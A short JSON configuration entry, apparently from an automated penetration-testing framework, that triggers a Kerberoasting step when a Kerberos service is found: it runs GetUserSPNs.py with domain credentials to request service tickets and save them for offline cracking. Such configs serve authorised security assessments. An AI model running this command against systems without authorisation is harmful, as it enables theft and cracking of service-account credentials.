{
    "toolname": "kerberoasting_tool",
    "command": "GetUserSPNs.py {domain}/{username}:{password} -dc-ip {ip} -request -outputfile {outputdir}/spns.txt > {outputdir}/kerberoast.txt",
    "trigger": ["kerberos-sec"],
    "active": true
}